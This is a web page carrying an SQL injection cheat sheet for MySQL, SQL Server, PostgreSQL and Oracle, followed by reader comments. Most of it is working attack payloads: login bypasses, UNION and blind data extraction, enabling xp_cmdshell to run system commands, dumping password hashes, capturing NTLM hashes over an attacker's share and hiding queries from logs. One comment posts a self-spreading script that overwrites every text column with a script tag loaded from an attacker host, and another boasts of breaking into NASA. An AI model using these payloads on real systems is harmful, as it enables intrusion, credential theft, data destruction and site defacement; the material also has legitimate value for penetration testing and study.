Ferruh Mavituna Logo
 Menüyü Gizle

SQL Injection Cheat Sheet

Etiketler sql injection, security, web application security, web uygulamasi guvenligi, english, 15.03.2007


Find and exploit SQL Injections with Netsparker, Next Generation Web Application Security Scanner



SQL Injection Cheat Sheet, Document Version 1.4

About SQL Injection Cheat Sheet

Currently only for MySQL and Microsoft SQL Server, some ORACLE and some PostgreSQL. Most of samples are not correct for every single situation. Most of the real world environments may change because of parenthesis, different code bases and unexpected, strange SQL sentences.

Samples are provided to allow reader to get basic idea of a potential attack and almost every section includes a brief information about itself.

M :	MySQL
S :	SQL Server
P :	PostgreSQL
O :	Oracle
+ :	Possibly all other databases
Examples;

(MS) means : MySQL and SQL Server etc.
(M*S) means : Only in some versions of MySQL or special conditions see related note and SQL Server
Table Of Contents

About SQL Injection Cheat Sheet
Syntax Reference, Sample Attacks and Dirty SQL Injection Tricks
Line Comments
SQL Injection Attack Samples
Inline Comments
Classical Inline Comment SQL Injection Attack Samples
MySQL Version Detection Sample Attacks
Stacking Queries
Language / Database Stacked Query Support Table
About MySQL and PHP
Stacked SQL Injection Attack Samples
If Statements
MySQL If Statement
SQL Server If Statement
If Statement SQL Injection Attack Samples
Using Integers
String  Operations
String Concatenation
Strings without Quotes
Hex based SQL Injection Samples
String Modification & Related
Union Injections
UNION – Fixing Language Issues
Bypassing Login Screens
Enabling xp_cmdshell in SQL Server 2005
Other parts are not so well formatted but check out by yourself, drafts, notes and stuff, scroll down and see.
Syntax Reference, Sample Attacks and Dirty SQL Injection Tricks

Ending / Commenting Out / Line Comments

Line Comments

Comments out rest of the query.
Line comments are generally useful for ignoring rest of the query so you don’t have to deal with fixing the syntax.

-- (SM)
DROP sampletable;--

# (M)
DROP sampletable;#
Line Comments Sample SQL Injection Attacks

Username: admin'--
SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'
This is going to log you as admin user, because rest of the SQL query will be ignored.
Inline Comments

Comments out rest of the query by not closing them or you can use for bypassing blacklisting, removing spaces, obfuscating and determining database versions.

/*Comment Here*/ (SM)
DROP/*comment*/sampletable
DR/**/OP/*bypass blacklisting*/sampletable
SELECT/*avoid-spaces*/password/**/FROM/**/Members

/*! MYSQL Special SQL */ (M)
This is a special comment syntax for MySQL. It’s perfect for detecting MySQL version. If you put a code into this comments it’s going to execute in MySQL only. Also you can use this to execute some code only if the server is higher than supplied version.

SELECT /*!32302 1/0, */ 1 FROM tablename
Classical Inline Comment SQL Injection Attack Samples

ID: 10; DROP TABLE members /*
Simply get rid of other stuff at the end the of query. Same as 10; DROP TABLE members --

SELECT /*!32302 1/0, */ 1 FROM tablename
Will throw an divison by 0 error if MySQL version is higher than 3.23.02
MySQL Version Detection Sample Attacks

ID: /*!32302 10*/
ID: 10
You will get the same response if MySQL version is higher than 3.23.02

SELECT /*!32302 1/0, */ 1 FROM tablename
Will throw an divison by 0 error if MySQL version is higher than 3.23.02
Stacking Queries

Executing more than one query in one transaction. This is very useful in every injection point, especially in SQL Server back ended applications.

; (S)
SELECT * FROM members; DROP members--
Ends a query and starts a new one.

Language / Database Stacked Query Support Table

green: supported, dark gray: not supported, light gray: unknown

 	SQL Server	MySQL	PostgreSQL	ORACLE	MS Access
ASP
ASP.NET
PHP
Java


About MySQL and PHP;
To clarify some issues;
PHP - MySQL doesn't support stacked queries, Java doesn't support stacked queries (I'm sure for ORACLE, not quite sure about other databases). Normally MySQL supports stacked queries but because of database layer in most of the configurations it’s not possible to execute second query in PHP-MySQL applications or maybe MySQL client supports this, not quite sure. Can someone clarify?

Stacked SQL Injection Attack Samples

ID: 10;DROP members --
SELECT * FROM products WHERE id = 10; DROP members--
This will run DROP members SQL sentence after normal SQL Query.

If Statements

Get response based on a if statement. This is one of the key points of Blind SQL Injection, also can be very useful to test simple stuff blindly and accurately.

MySQL If Statement

IF(condition,true-part,false-part) (M)
SELECT IF(1=1,'true','false')
SQL Server If Statement

IF condition true-part ELSE false-part (S)
IF (1=1) SELECT 'true' ELSE SELECT 'false'
If Statement SQL Injection Attack Samples

if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0 (S)
This will throw an divide by zero error if current logged user is not "sa" or "dbo".

Using Integers

Very useful for bypassing, magic_quotes() and similar filters, or even WAFs.

0xHEXNUMBER (SM)
You can  write hex like these;

SELECT CHAR(0x66) (S)
SELECT 0x5045 (this is not an integer it will be a string from Hex) (M)
SELECT 0x50 + 0x45 (this is integer now!) (M)
String  Operations

String related operations. These can be quite useful to build up injections which are not using any quotes, bypass any other black listing or determine back end database.

String Concatenation

+ (S)
SELECT login + '-' + password FROM members

|| (*MO)
SELECT login || '-' || password FROM members
*About MySQL "||";
If MySQL is running in ANSI mode it’s going to work but otherwise MySQL accept it as `logical operator` it’ll return 0. Better way to do it is using CONCAT() function in MySQL.

CONCAT(str1, str2, str3, ...) (M)
Concatenate supplied strings.
SELECT CONCAT(login, password) FROM members
Strings without Quotes

These are some direct ways to using strings but it’s always possible to use CHAR()(MS) and CONCAT()(M) to generate string without quotes.

0x457578 (M) - Hex Representation of string
SELECT 0x457578
This will be selected as string in MySQL.

In MySQL easy way to generate hex representations of strings use this;
SELECT CONCAT('0x',HEX('c:\\boot.ini'))

Using CONCAT() in MySQL
SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77)) (M)
This will return ‘KLM’.

SELECT CHAR(75)+CHAR(76)+CHAR(77) (S)
This will return ‘KLM’.
Hex based SQL Injection Samples

SELECT LOAD_FILE(0x633A5C626F6F742E696E69) (M)
This will show the content of c:\boot.ini
String Modification & Related

ASCII() (SMP)
Returns ASCII character value of leftmost character. A must have function for Blind SQL Injections.

SELECT ASCII('a')

CHAR() (SM)
Convert an integer of ASCII.

SELECT CHAR(64)
Union Injections

With union you do SQL queries cross-table. Basically you can poison query to return records from another table.

SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members
This will combine results from both news table and members table and return all of them.

Another Example :
' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--

UNION – Fixing Language Issues

While exploiting Union injections sometimes you get errors because of different language settings (table settings, field settings, combined table / db settings etc.) these functions are quite useful to fix this problem. It's rare but if you dealing with Japanese, Russian, Turkish etc. applications then you will see it.

SQL Server (S)
Use field COLLATE SQL_Latin1_General_Cp1254_CS_AS or some other valid one - check out SQL Server documentation.

SELECT header FROM news UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS FROM members

MySQL (M)
Hex() for every possible issue
Bypassing Login Screens (SMO+)

SQL Injection 101, Login tricks
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1--
....
Login as different user (SM*)
' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--
*Old versions of MySQL doesn't support union queries

Bypassing second MD5 hash check login screens

If application is first getting the record by username and then compare returned MD5 with supplied password's MD5 then you need to some extra tricks to fool application to bypass authentication. You can union results with a known password and MD5 hash of supplied password. In this case application will compare your password and your supplied MD5 hash instead of MD5 from database.

Bypassing MD5 Hash Check Example (MSP)

Username : admin
Password : 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055

81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)



Error Based - Find Columns Names

Finding Column Names with HAVING BY - Error Based (S)

In the same order,

' HAVING 1=1 --
' GROUP BY table.columnfromerror1 HAVING 1=1 --
' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 --
' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- and so on
If you are not getting any more error then it's done.
Finding how many columns in SELECT query by ORDER BY (MSO+)

Finding column number by ORDER BY can speed up the UNION SQL Injection process.

ORDER BY 1--
ORDER BY 2--
ORDER BY N-- so on
Keep going until get an error. Error means you found the number of selected columns.
Data types, UNION, etc.

Hints,

Always use UNION with ALL because of image similiar non-distinct field types. By default union tries to get records with distinct.
To get rid of unrequired records from left table use -1 or any not exist record search in the beginning of query (if injection is in WHERE). This can be critical if you are only getting one result at a time.
Use NULL in UNION injections for most data type instead of trying to guess string, date, integer etc.
Be careful in Blind situtaions may you can understand error is coming from DB or application itself. Because languages like ASP.NET generally throws errors while trying to use NULL values (because normally developers are not expecting to see NULL in a username field)
Finding Column Type

' union select sum(columntofind) from users-- (S)
Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
[Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a varchar data type as an argument.

If you are not getting error it means column is numeric.

Also you can use CAST() or CONVERT()
SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL--

11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –-
No Error - Syntax is right. MS SQL Server Used. Proceeding.

11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –-
No Error – First column is an integer.

11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 --
Error! – Second column is not an integer.

11223344) UNION SELECT 1,’2’,NULL,NULL WHERE 1=2 –-
No Error – Second column is a string.

11223344) UNION SELECT 1,’2’,3,NULL WHERE 1=2 –-
Error! – Third column is not an integer. ...

Microsoft OLE DB Provider for SQL Server error '80040e07'
Explicit conversion from data type int to image is not allowed.
You’ll get convert() errors before union target errors ! So start with convert() then union

Simple Insert (MSO+)

'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/*
Useful Function / Information Gathering / Stored Procedures / Bulk SQL Injection Notes

@@version (MS)
Version of database and more details for SQL Server. It's a constant. You can just select it like any other column, you don't need to supply table name. Also you can use insert, update statements or in functions.

INSERT INTO members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10)

Bulk Insert (S)

Insert a file content to a table. If you don't know internal path of web application you can read IIS (IIS 6 only) metabase file (%systemroot%\system32\inetsrv\MetaBase.xml) and then search in it to identify application path.

Create table foo( line varchar(8000) )
bulk insert foo from 'c:\inetpub\wwwroot\login.asp'
Drop temp table, and repeat for another file.
BCP (S)

Write text file. Login Credentials are required to use this function.
bcp "SELECT * FROM test..foo" queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Usa -Pfoobar

VBS, WSH in SQL Server (S)

You can use VBS, WSH scripting in SQL Server because of ActiveX support.

declare @o int
exec sp_oacreate 'wscript.shell', @o out
exec sp_oamethod @o, 'run', NULL, 'notepad.exe'
Username: '; declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL, 'notepad.exe' --

Executing system commands, xp_cmdshell (S)

Well known trick, By default it's disabled in SQL Server 2005. You need to have admin access.

EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'

Simple ping check (configure your firewall or sniffer to identify request before launch it),

EXEC master.dbo.xp_cmdshell 'ping '

You can not read results directly from error or union or something else.

Some Special Tables in SQL Server (S)

Error Messages
master..sysmessages

Linked Servers
master..sysservers

Password (2000 and 20005 both can be crackable, they use very similar hashing algorithm )
SQL Server 2000: masters..sysxlogins
SQL Server 2005 : sys.sql_logins
More Stored Procedures for SQL Server (S)

Cmd Execute (xp_cmdshell)
exec master..xp_cmdshell 'dir'

Registry Stuff (xp_regread)
xp_regaddmultistring
xp_regdeletekey
xp_regdeletevalue
xp_regenumkeys
xp_regenumvalues
xp_regread
xp_regremovemultistring
xp_regwrite
exec xp_regread HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters', 'nullsessionshares'
exec xp_regenumvalues HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\snmp\parameters\validcommunities'

Managing Services (xp_servicecontrol)
Medias (xp_availablemedia)
ODBC Resources (xp_enumdsn)
Login mode (xp_loginconfig)
Creating Cab Files (xp_makecab)
Domain Enumeration (xp_ntsec_enumdomains)
Process Killing (need PID) (xp_terminate_process)
Add new procedure (virtually you can execute whatever you want)
sp_addextendedproc ‘xp_webserver’, ‘c:\temp\x.dll’
exec xp_webserver
Write text file to a UNC or an internal path (sp_makewebtask)
MSSQL Bulk Notes

SELECT * FROM master..sysprocesses /*WHERE spid=@@SPID*/

DECLARE @result int; EXEC @result = xp_cmdshell 'dir *.exe';IF (@result = 0) SELECT 0 ELSE SELECT 1/0

HOST_NAME()
IS_MEMBER (Transact-SQL)
IS_SRVROLEMEMBER (Transact-SQL)
OPENDATASOURCE (Transact-SQL)

INSERT tbl EXEC master..xp_cmdshell OSQL /Q"DBCC SHOWCONTIG"
OPENROWSET (Transact-SQL)  - http://msdn2.microsoft.com/en-us/library/ms190312.aspx

You can not use sub selects in SQL Server Insert queries.

SQL Injection in LIMIT (M) or ORDER (MSO)

SELECT id, product FROM test.test t LIMIT 0,0 UNION ALL SELECT 1,'x'/*,10 ;

If injection is in second limit you can comment it out or use in your union injection

Shutdown SQL Server (S)

When you really pissed off, ';shutdown --

Enabling xp_cmdshell in SQL Server 2005

By default xp_cmdshell and couple of other potentially dangerous stored procedures are disabled in SQL Server 2005. If you have admin access then you can enable these.

EXEC sp_configure 'show advanced options',1
RECONFIGURE

EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE

Finding Database Structure in SQL Server (S)

Getting User defined Tables

SELECT name FROM sysobjects WHERE xtype = 'U'

Getting Column Names

SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'tablenameforcolumnnames')

Moving records (S)

Modify WHERE and use NOT IN or NOT EXIST,
... WHERE users NOT IN ('First User', 'Second User')
SELECT TOP 1 name FROM members WHERE NOT EXIST(SELECT TOP 0 name FROM members) -- very good one

Using Dirty Tricks
SELECT * FROM Product WHERE ID=2 AND 1=CAST((Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE i.id<=o.id) AS x, name from sysobjects o) as p where p.x=3) as int

Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE xtype='U' and i.id<=o.id) AS x, name from sysobjects o WHERE o.xtype = 'U') as p where p.x=21


Fast way to extract data from Error Based SQL Injections in SQL Server (S)

';BEGIN DECLARE @rt varchar(8000) SET @rd=':' SELECT @rd=@rd+' '+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'MEMBERS') AND name>@rd SELECT @rd AS rd into TMP_SYS_TMP end;--

Detailed Article : Fast way to extract data from Error Based SQL Injections

Blind SQL Injections

About Blind SQL Injections

In a quite good production application generally you can not see error responses on the page, so you can not extract data through Union attacks or error based attacks. You have to do use Blind SQL Injections attacks to extract data. There are two kind of Blind Sql Injections.

Normal Blind, You can not see a response in the page but you can still determine result of a query from response or HTTP status code
Totally Blind, You can not see any difference in the output in any kind. This can be an injection a logging function or similar. Not so common though.

In normal blinds you can use if statements or abuse WHERE query in injection (generally easier), in totally blinds you need to use some waiting functions and analyze response times. For this you can use WAIT FOR DELAY '0:0:10' in SQL Server, BENCHMARK() in MySQL, pg_sleep(10) in PostgreSQL, and some PL/SQL tricks in ORACLE.

Real and a bit Complex Blind SQL Injection Attack Sample

This output taken from a real private Blind SQL Injection tool while exploiting SQL Server back ended application and enumerating table names. This requests done for first char of the first table name. SQL queries a bit more complex then requirement because of automation reasons. In we are trying to determine an ascii value of a char via binary search algorithm.

TRUE and FALSE flags mark queries returned true or false.

TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>78--

FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>103--

TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)<103--

FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>89--

TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)<89--

FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>83--

TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)<83--

FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>80--

FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)<80--

Since both of the last 2 queries failed we clearly know table name's first char's ascii value is 80 which means first char is `P`. This is the way to exploit Blind SQL injections by binary search algorithm. Other well known way is reading data bit by bit. Both can be effective in different conditions.



Waiting For Blind SQL Injections

First of all use this if it's really blind, otherwise just use 1/0 style errors to identify difference. Second, be careful while using times more than 20-30 seconds. database API connection or script can be timeout.

WAIT FOR DELAY 'time' (S)

This is just like sleep, wait for spesified time. CPU safe way to make database wait.

WAITFOR DELAY '0:0:10'--

Also you can use fractions like this,

WAITFOR DELAY '0:0:0.51'

Real World Samples

Are we 'sa' ?
if (select user) = 'sa' waitfor delay '0:0:10'
ProductID = 1;waitfor delay '0:0:10'--
ProductID =1);waitfor delay '0:0:10'--
ProductID =1';waitfor delay '0:0:10'--
ProductID =1');waitfor delay '0:0:10'--
ProductID =1));waitfor delay '0:0:10'--
ProductID =1'));waitfor delay '0:0:10'--
BENCHMARK() (M)

Basically we are abusing this command to make MySQL wait a bit. Be careful you will consume web servers limit so fast!

BENCHMARK(howmanytimes, do this)

Real World Samples

Are we root ? woot!
IF EXISTS (SELECT * FROM users WHERE username = 'root') BENCHMARK(1000000000,MD5(1))

Check Table exist in MySQL
IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))
pg_sleep(seconds) (P)

Sleep for supplied seconds.

SELECT pg_sleep(10);
Sleep 10 seconds.
Covering Tracks

SQL Server -sp_password log bypass (S)

SQL Server don't log queries which includes sp_password for security reasons(!). So if you add --sp_password to your queries it will not be in SQL Server logs (of course still will be in web server logs, try to use POST if it's possible)

Clear SQL Injection Tests

These tests are simply good for blind sql injection and silent attacks.

product.asp?id=4 (SMO)
product.asp?id=5-1
product.asp?id=4 OR 1=1

product.asp?name=Book
product.asp?name=Bo’%2b’ok
product.asp?name=Bo’ || ’ok (OM)
product.asp?name=Book’ OR ‘x’=’x
Some Extra MySQL Notes

Sub Queries are working only MySQL 4.1+
Users
SELECT User,Password FROM mysql.user;
SELECT 1,1 UNION SELECT IF(SUBSTRING(Password,1,1)='2',BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = ‘root’;
SELECT ... INTO DUMPFILE
Write query into a new file (can not modify existing files)
UDF Function
create function LockWorkStation returns integer soname 'user32';
select LockWorkStation();
create function ExitProcess returns integer soname 'kernel32';
select exitprocess();
SELECT USER();
SELECT password,USER() FROM mysql.user;
First byte of admin hash
SELECT SUBSTRING(user_password,1,1) FROM mb_users WHERE user_group = 1;
Read File
query.php?user=1+union+select+load_file(0x63...),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
MySQL Load Data inifile
By default it’s not avaliable !
create table foo( line blob );
load data infile 'c:/boot.ini' into table foo;
select * from foo;
More Timing in MySQL
select benchmark( 500000, sha1( 'test' ) );
query.php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
select if( user() like 'root@%', benchmark(100000,sha1('test')), 'false' );
Enumeration data, Guessed Brute Force
select if( (ascii(substring(user(),1,1)) >> 7) & 1, benchmark(100000,sha1('test')), 'false' );
Potentially Useful MySQL Functions

MD5()
MD5 Hashing
SHA1()
SHA1 Hashing

PASSWORD()
ENCODE()
COMPRESS()
Compress data, can be great in large binary reading in Blind SQL Injections.
ROW_COUNT()
SCHEMA()
VERSION()
Same as @@version
Second Order SQL Injections

Basically you put an SQL Injection to some place and expect it's unfiltered in another action. This is common hidden layer problem.

Name : ' + (SELECT TOP 1 password FROM users ) + '
Email : xx@xx.com

If application is using name field in an unsafe stored procedure or function, process etc. then it will insert first users password as your name etc.

Forcing SQL Server to get NTLM Hashes

This attack can help you to get SQL Server user's Windows password of target server, but possibly you inbound connection will be firewalled. Can be very useful internal penetration tests. We force SQL Server to connect our Windows UNC Share and capture data NTLM session with a tool like Cain & Abel.

Bulk insert from a UNC Share (S)
bulk insert foo from '\\YOURIPADDRESS\C$\x.txt'

Check out Bulk Insert Reference to understand how can you use bulk insert.

References

Since these notes collected from several different sources within several years and personal experiences, may I missed some references. If you believe I missed yours or someone else then drop me an email (ferruh-at-mavituna.com), I'll update it as soon as possible.

Lots of Stuff
Advanced SQL Injection In SQL Applications, Chris Anley
More Advanced SQL Injection In SQL Applications, Chris Anley
Blindfolded SQL Injection, Ofer Maor – Amichai Shulman
Hackproofing MySQL, Chris Anley
Database Hacker's Handbook, David Litchfield, Chris Anley, John Heasman, Bill Grindlay
Upstairs Team!

MSSQL Related
MSSQL Operators - http://msdn2.microsoft.com/en-us/library/aa276846(SQL.80).aspx
Transact-SQL Reference - http://msdn2.microsoft.com/en-us/library/aa299742(SQL.80).aspx
String Functions (Transact-SQL)  - http://msdn2.microsoft.com/en-us/library/ms181984.aspx
List of MSSQL Server Collation Names - http://msdn2.microsoft.com/en-us/library/ms180175.aspx
MSSQL Server 2005 Login Information and some other functions : Sumit Siddharth

MySQL Related
Comments : http://dev.mysql.com/doc/
Control Flows - http://dev.mysql.com/doc/refman/5.0/en/control-flow-functions.html
MySQL Gotchas - http://sql-info.de/mysql/gotchas.htm
New SQL Injection Concept, Tonu Samuel
ChangeLog

15/03/2007 - Public Release v1.0
16/03/2007 - v1.1
Links added for some paper and book references
Collation sample added
Some typos fixed
Styles and Formatting improved
New MySQL version and comment samples
PostgreSQL Added to Ascii and legends, pg_sleep() added blind section
Blind SQL Injection section and improvements, new samples
Reference paper added for MySQL comments
21/03/2007 - v1.2
BENCHMARK() sample changed to avoid people DoS their MySQL Servers
More Formatting and Typo
Descriptions for some MySQL Function
30/03/2007 v1.3
Niko pointed out PotsgreSQL and PHP supports stacked queries
Bypassing second MD5 check login screens description and attack added
Mark came with extracting NTLM session idea, added
Detailed Blind SQL Exploitation added
13/04/2007 v1.4 - Release
SQL Server 2005 enabling xp_cmdshell added (trick learned from mark)
Japanese version of SQL Injection Cheat Sheet released (v1.1)
To Do / Contact / Help

I got lots of notes for ORACLE, PostgreSQL, DB2 and MS Access and some of undocumented tricks in here. They will be available soon I hope. If you want to help or send a new trick, not here thing just drop me an email (ferruh-at-mavituna.com).

 Yorum Ekle Yorumunu Ekle -  Yazıcı Versiyonu Yazıcı Versiyonu -  Yorumlar için RSS Yorumlar için RSS
İlişkili olabilecek yazılar

SQL Injection Cheat Sheet is Online !
SQL Injection Cheat Sheet Online!
SQL Injection Cheat Sheet Yenilendi

Ravendra Patel - 12 gün 3 saat 24 dakika önce

Thanks so much dear. I'll always looking your help...


"vinnu" - 15 gün 5 saat 9 dakika önce

This is my SQL virus module for Uday virus (SQL+XSS+AJAX):

';while(1=1) BEGIN DECLARE @Ta varchar(255),@Co varchar(4000) DECLARE uday CURSOR FOR select x.name,y.column_name from sysobjects x,information_schema.columns y where x.name=y.table_name and x.type='U' and (y.data_type='varchar' or y.data_type='text') OPEN uday FETCH NEXT FROM uday INTO @Ta,@Co WHILE(@@FETCH_STATUS=0) BEGIN exec('update ['+@Ta+'] set ['+@Co+']=''<H2>Legion Of Xtremers</H2><HR><H1>Owned by LOXians now..."vinnu"<script src="http://attackerserver/malicious.js"></script>'' where '+@Co+' not like ''XXXX''')FETCH NEXT FROM uday INTO @Ta,@Co END CLOSE uday DEALLOCATE uday commit END--sp_password


It hunts for all varchar or TEXT type columns in all user defined tables and replaces the values with the malicious values.

"vinnu"
Legion Of Xtremers (India)


Tesekkur ederim - 25 gün 4 saat 23 dakika önce

Really Great Job dude.
Keep up!
Respect

Tesekkur ederim Abi:)


Seagate - 04.03.2010

Vinnu where can I contact you for a job?


vinnu - 16.02.2010

Jaijeya
Some tips about MS-Access (Jet database engine):

You should not insert comment characters as Jet db engine doesn't recognise them so avoid them in injection.
Instead you should try to inject the SQL in such a way that it satisfies the whole query.
In most cases the injection can be done in where or order by clauses so for example:
if query is like: WHERE title LIKE '%<injectionhere>%'
Then do it like: WHERE title LIKE'%a' your SQL here WHERE name LIKE 'a%'
...Likewise.
To know rest of the query insert a single double quote " after a single quote ', in most cases it will reveal the part of query right from injection point.

It is possible to use other databases or files from query. This can also be helpful in enumerating the directory structure of the target server.
Also it is most probable that the server will be windows based if Jet db engine is there. In this case there exists a file called setuplog.txt which gets created right at the time of windows installation and it contains important information about server os and hardware, and it is compatible to be loaded in a query as a table:

'+union+select+1,File,Message,Line,Time,6,Tag,8,9,10,11+from+[TEXT;DATABASE=c:%5Cwindows;HDR=YES;FMT=Delimited].[setuplog.txt]'


eslimasec - 13.02.2010

Dear Ferruh,

we developped a small tool to aid Webapptesting that includes many of your tricks, It can be find herehttp://wiki.eslimasec.com/esliwiki/ProjectsPost.

hope it is useful 4 u and ya readers.

best regards


vinnu - 12.02.2010

In case of Oracle database server, when union doesn't work, then we can retrieve the desired results randomly. It helped me a lot in Penetrating into NASA.
Following type of injection will be helpful in such cases:

'or+1=utl_inaddr.get_host_address((SELECT+username+FROM+(SELECT+username+FROM+all_users+ORDER+BY+dbms_random.value)+WHERE+rownum=1))--


vinnu - 12.02.2010

Also in case if u r just pairing single quotes, then u can easily ecape one of the single quote using a forward slash "\".
This will again break the SQL query and will inject the parameter as a SQL query.


mr.ots - 05.02.2010

waow.
this is not going to be a waste bookmark!
thanks:)


AK213 - 03.02.2010

Goooood


vinnu - 28.01.2010

@Brent Jenkins:
Well there is a case, when this check can be thwarted, check scenario:
There are atleast two input fields (mostly user/password) and the fields are bound to the maxlength, and the maxlength check is also implemented in server side script e.g. asp, php etc.
Noiw If u fill the first comming input with single quote ' (SQL meta) then, above script will try to pair up the single quotes.
Now if all the space is acquired by single quotes, then above listed script will try to pair up all the single quotes and this will obviously increase the size of input variable. Then if, the variable input is tripped, then it may lead to an unpaired single quotation mark, this will pair up with the second condition's first single quote and will make second condition as a string and the second input becomes a part of SQL script and making SQL injection feasible.
LOX (Legion Of Xtremers)INDIA


kai - 31.10.2009

this sql not working in .aspx login page. can anyone tell me sql injection to bypass .aspx login page.


kristofdpx - 29.09.2009

Stacked queries didn't work with PHP-MYSQL. Tested on PHP 5.2.1 and Mysql 5.0


jambo - 27.07.2009

If this helps at all, follow this link to a page I posted with some programming help against those SQL Injection attacks!
Hey. Thanks for the tutorial. It is very complete.


bugman - 02.07.2009

All the listed cases are true only for those lames who still use concatenation of user-driven datum to SQL code instead of parameters-binding mechanism


milon - 01.07.2009

hello
any one can give me an example how to apply SQL injection in website details.


Kyo - 26.03.2009

I've got a little tool for generating CHAR() and hex codes for SQL injections if magic quotes is enabled here:

http://wocares.com/noquote.php

just check SQL Injection


zniko07 - 05.03.2009

' OR 1=1--
oh i tried to sql inject your comments but it didn't worked:D! lol
i really liked your article!! it's great! thank you



dave roberts - 27.01.2009

Thanks so much for the document. Its simply awesome, i m successful;)


fLaSh - 31.12.2008

I really liked the cheatsheet. nice work!

Author of MySQLi Dumper

1 - 2 - 3 - 4 - İleri » - »»
Yorum Yazın


Tüm yorumlar onaydan geçmektedir, bu işlem en uzun 30 dk. sürecektir. E-mail adresleri yeni yorumları bildirme harici hiç bir başka amaçla kullanılmamaktadır ve sitede gözükmemektedir.
İsim / Nick :
Email :
Web Sitesi :

Captcha KoduSağdaki Resimdeki Numaralar :


ferruh.mavituna

Site genel olarak güvenlik, internet ve web teknolojileri üzerine yazdığım yazılardan oluşmaktadır. Sitede 2003 yılından bu yana yazılmış 1750' den fazla yazı bulunmaktadır.

Bunun yanında projeler de geliştirdiğim projeleri, ar-ge kısmında güvenlik araştırma dokümanlarıma ulaşabilir, programlar kısmından yazdığım yazılımları download edebilirsiniz. Site hakkında.

List of english articles, RSS or try this page.

PROJECTS

Freaking Simple Fuzzer
Psycho Folder
BSQL Hacker
Win MD5 Checksum Tool
Hocus Pocus
SQL Injection Cheat Sheet
WebRaider
ARAMA


Detaylı Arama
TAKİP

Siteyi RSS ile Takip Et  Siteyi E-mail ile Takip Et  RSS Takipçileri
